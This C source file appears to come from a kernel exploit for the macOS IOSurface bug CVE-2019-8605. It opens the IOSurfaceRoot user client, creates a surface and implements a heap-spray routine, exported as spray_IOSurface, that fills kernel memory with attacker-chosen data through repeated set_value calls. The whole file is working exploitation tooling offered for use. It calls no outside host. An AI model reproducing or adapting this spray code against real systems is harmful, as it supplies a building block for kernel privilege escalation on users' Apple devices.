#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

#include "helper.h"
#include "iokit.h"
#include "exp.h"
#include "iosurface.h"


// The ID of the IOSurface we're using.
uint32_t IOSurface_id;

// Is the IOSurface subsystem initialized?
bool IOSurface_initialized;

// The IOSurfaceRoot service.
mach_port_t IOSurfaceRoot;

// An IOSurfaceRootUserClient instance.
mach_port_t IOSurfaceRootUserClient;


bool
IOSurface_init() {
    if (IOSurface_initialized) {
		return true;
	}

    IOSurfaceRoot = IOServiceGetMatchingService(
        kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));

    if (IOSurfaceRoot == MACH_PORT_NULL) {
        ERROR("Couldn't find IOSurfaceRoot\n");
        return false;
    }

    kern_return_t kr = IOServiceOpen(
        IOSurfaceRoot,
        mach_task_self(),
        0,
        &IOSurfaceRootUserClient);
    if(kr != KERN_SUCCESS) {
        ERROR("Couldn't open IOSurfaceRootUserClient, kr=0x%x\n", kr);
        return false;
    }

    //seos-iMac-Pro:CVE-2019-8605 seo$ sysctl hw.pagesize
    //hw.pagesize: 4096
    struct _IOSurfaceFastCreateArgs create_args = { 
        .alloc_size = 4096};
    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = sizeof(lock_result);

    // IOSurfaceRootUserClient::externalMethod
    //-> IOUserClient::externalMethod
    // ... -> IOSurfaceRootUserClient::s_create_surface_fast_path
    kr = IOConnectCallMethod(
        IOSurfaceRootUserClient,
        6, //IOSurfaceRootUserClient::s_create_surface_fast_path
        NULL, 0,
        &create_args, sizeof(create_args),
        NULL, NULL,
        &lock_result, &lock_result_size
    );
    if(kr != KERN_SUCCESS) {
        ERROR("Failed to call create_surface_client_fast_path, kr=0x%x\n", kr);
        return false;
    }
    IOSurface_id = lock_result.surface_id;
    IOSurface_initialized = true;
    INFO("IOSurface_init success, IOSurface_id=0x%x\n", IOSurface_id);
    return true;
}

void
IOSurface_deinit() {
	IOSurface_initialized = false;
	IOSurface_id = 0;
	IOServiceClose(IOSurfaceRootUserClient);
	IOObjectRelease(IOSurfaceRoot);
}


/*
 * IOSurface_set_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::set_value().
 */
bool
IOSurface_set_value(const struct IOSurfaceValueArgs *args, size_t args_size) {
	struct IOSurfaceValueResultArgs result;
	size_t result_size = sizeof(result);
	kern_return_t kr = IOConnectCallMethod(
			IOSurfaceRootUserClient,
			9, // set_value
			NULL, 0,
			args, args_size,
			NULL, NULL,
			&result, &result_size);
	if (kr != KERN_SUCCESS) {
		ERROR("failed to %s value in %s: 0x%x", "set", "IOSurface", kr);
		return false;
	}
	return true;
}

/*
 * IOSurface_spray_with_gc_internal
 *
 * Description:
 * 	A generalized version of IOSurface_spray_with_gc() and IOSurface_spray_size_with_gc().
 */

static uint32_t total_arrays = 0;
bool
IOSurface_spray_with_gc_internal(uint32_t array_count, uint32_t array_length, uint32_t extra_count,
		void *data, uint32_t data_size,
		void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
	assert(array_count <= 0xffffff);
	assert(array_length <= 0xffff);
	assert(data_size <= 0xffffff);
	assert(extra_count < array_count);
	// Make sure our IOSurface is initialized.
	bool ok = IOSurface_init();
	if (!ok) {
		return 0;
	}
	// How big will our OSUnserializeBinary dictionary be?
	uint32_t current_array_length = array_length + (extra_count > 0 ? 1 : 0);
	size_t xml_units_per_data = xml_units_for_data_size(data_size);
	size_t xml_units = 1 + 1 + 1 + (1 + xml_units_per_data) * current_array_length + 1 + 1 + 1;
	// Allocate the args struct.
	struct IOSurfaceValueArgs *args;
	size_t args_size = sizeof(*args) + xml_units * sizeof(args->xml[0]);
	args = malloc(args_size);
	assert(args != 0);
	// Build the IOSurfaceValueArgs.
	args->surface_id = IOSurface_id;
	// Create the serialized OSArray. We'll remember the locations we need to fill in with our
	// data as well as the slot we need to set our key.
	uint32_t **xml_data = malloc(current_array_length * sizeof(*xml_data));
	assert(xml_data != NULL);
	uint32_t *key;
	size_t xml_size = serialize_IOSurface_data_array(args->xml,
			current_array_length, data_size, xml_data, &key);
	assert(xml_size == xml_units * sizeof(args->xml[0]));
	// Keep track of when we need to do GC.
	size_t sprayed = 0;
	size_t next_gc_step = 0;
	// Loop through the arrays.
	for (uint32_t array_id = 0; array_id < array_count; array_id++) {
		// If we've crossed the GC sleep boundary, sleep for a bit and schedule the
		// next one.
		// Now build the array and its elements.
		*key = base255_encode(total_arrays + array_id);
		for (uint32_t data_id = 0; data_id < current_array_length; data_id++) {
			// Update the data for this spray if the user requested.
			if (callback != NULL) {
				callback(array_id, data_id, data, data_size);
			}
			// Copy in the data to the appropriate slot.
			memcpy(xml_data[data_id], data, data_size - 1);
		}
        //XXX: Dump
        // dump_xml_data(args, args_size);

		// Finally set the array in the surface.
		ok = IOSurface_set_value(args, args_size);
		if (!ok) {
			free(args);
			free(xml_data);
			return false;
		}
		if (ok) {
			sprayed += data_size * current_array_length;
			// If we just sprayed an array with an extra element, decrement the
			// outstanding extra_count.
			if (current_array_length > array_length) {
				assert(extra_count > 0);
				extra_count--;
				// If our extra_count is now 0, rebuild our serialized array. (We
				// could implement this as a memmove(), but I'm lazy.)
				if (extra_count == 0) {
					current_array_length--;
					serialize_IOSurface_data_array(args->xml,
							current_array_length, data_size,
							xml_data, &key);
				}
			}
		}
	}
	if (next_gc_step > 0) {
		// printf("\n");
	}
	// Clean up resources.
	free(args);
	free(xml_data);
	total_arrays += array_count;
	return true;
}

bool
IOSurface_spray_with_gc(uint32_t array_count, uint32_t array_length,
		void *data, uint32_t data_size,
		void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
	return IOSurface_spray_with_gc_internal(array_count, array_length, 0,
			data, data_size, callback);
}

int spray_IOSurface(void *data, size_t size) {
    return !IOSurface_spray_with_gc(32, 256, data, (uint32_t)size, NULL);
}